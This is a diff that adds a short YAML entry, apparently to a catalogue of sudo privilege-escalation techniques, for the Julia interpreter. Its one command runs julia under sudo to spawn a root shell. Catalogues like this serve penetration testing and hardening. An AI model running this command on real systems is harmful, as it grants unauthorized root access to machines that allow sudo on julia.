@@ -1,0 +1,4 @@
+name: julia
+binary_path: /usr/bin/julia
+exploit_cmds:
+- sudo /usr/bin/julia -e 'run(`/bin/sh`)'
